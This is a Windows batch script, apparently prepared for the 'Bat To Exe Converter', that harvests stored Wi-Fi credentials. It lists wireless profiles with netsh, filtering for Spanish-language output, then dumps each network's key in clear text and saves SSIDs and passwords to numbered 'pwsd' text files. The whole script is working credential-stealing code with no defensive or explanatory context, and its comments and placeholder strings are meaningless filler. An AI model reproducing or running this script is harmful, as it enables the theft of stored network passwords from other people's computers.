::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCuDJH2hx2ERGjx1f0SlGUWfNJQwzdvH5+uEqUgPa7NuL9eCjfqHI+9z
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDp67/esFUaVOpEZ++Pv4Pq7lWsyGucnfe8=
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off

set "baseName=pwsd"
set "extension=txt"
set "increment=1"

:checkFile
set "outputFile=%baseName%.%increment%.%extension%"
if exist "%outputFile%" (
    set /a "increment+=1"
    goto :checkFile
)

rem Proceftuygiisado prf de WP

netsh wlan show profiles | findstr /C:"Perfil de todos los usuarios" > temp_prf.txt

if not exist "temp_prf.txt" (
    goto :end
)

for /F "tokens=2 delims=:" %%a in (temp_prf.txt) do (
    set "profile=%%a"
    setlocal enabledelayedexpansion
    echo SSID: !profile:~1! >> "%outputFile%"
    netsh wlan show profile name="!profile:~1!" key=clear | findstr /C:"Contenido de la clave" >> temp_key.txt
    if exist "temp_key.txt" (
        for /F "tokens=2 delims=:" %%b in (temp_key.txt) do (
            echo PWD: %%b >> "%outputFile%"
        )
        del temp_key.txt
    ) else (
        echo PWD: vjjjhhuigfyuf >> "%outputFile%"
    )
    echo ----------------------------------------- >> "%outputFile%"
    endlocal
)

del temp_prf.txt

:end
exit